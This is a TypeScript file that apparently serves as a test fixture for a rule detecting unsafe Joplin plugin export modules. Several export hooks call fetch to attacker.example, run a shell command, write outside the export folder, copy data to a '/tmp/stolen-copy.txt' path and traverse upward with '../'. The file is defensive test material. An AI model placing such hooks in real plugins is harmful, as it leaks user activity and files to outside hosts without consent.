import * as childProcess from 'child_process';
import * as fs from 'fs';
import { FileSystemItem } from 'api/types';
import * as joplin from 'api';

function sendExportTelemetry() {
    fetch('https://attacker.example/helper-request');
}

async function closeExport(_context: any) {
    sendExportTelemetry();
}

class ClassExportModule {
    public format = 'class-export';
    public description = 'Class Export';
    public target = FileSystemItem.Directory;
    public isNoteArchive = false;

    public async onInit(_context: any) {
        fetch('https://attacker.example/class-export-opened');
    }

    public async onProcessItem(_context: any, _itemType: number, _item: any) {}
    public async onProcessResource(_context: any, _resource: any, _filePath: string) {}
    public async onClose(_context: any) {}
}

function createExportModule() {
    return {
        format: 'factory-export',
        description: 'Factory Export',
        target: FileSystemItem.Directory,
        isNoteArchive: false,
        async onInit(_context: any) {
            fetch('https://attacker.example/factory-export-opened');
        },
        async onProcessItem(_context: any, _itemType: number, _item: any) {},
        async onProcessResource(_context: any, _resource: any, _filePath: string) {},
        async onClose(_context: any) {},
    };
}

async function triggerRule() {
    const fsExtra = joplin.require('fs-extra');

    await joplin.interop.registerExportModule({
        format: 'attacker',
        description: 'Attacker Export',
        target: FileSystemItem.Directory,
        isNoteArchive: false,
        async onInit(context: any) {
            fetch('https://attacker.example/export-opened');
            childProcess.exec('echo export-opened');
            fs.writeFileSync('/tmp/export-opened.txt', 'opened');
            fs.writeFileSync(context.destPath + '/manifest.txt', 'ok');
        },

        async onProcessItem(context: any, itemType: number, item: any) {
            fs.writeFileSync('/tmp/export-item.txt', 'item');
            fs.copyFileSync('/tmp/source.txt', context.destPath + '/safe-copy.txt');
            fs.copyFileSync(context.destPath + '/source.txt', '/tmp/stolen-copy.txt');
            fs.copyFileSync('/tmp/source.txt', context.destPath + '/../escaped-copy.txt');
            fsExtra.outputFileSync('/tmp/fs-extra-export.txt', 'item');
        },

        async onProcessResource(context: any, resource: any, filePath: string) {
            ['/tmp/nested-unsafe.txt'].forEach(path => {
                fs.writeFileSync(path, 'nested write');
            });

            fs.writeFileSync(context.userData.path, 'user data is not an export destination');
        },

        onClose: closeExport,
    });

    await joplin.interop.registerExportModule(new ClassExportModule());
    await joplin.interop.registerExportModule(createExportModule());
}
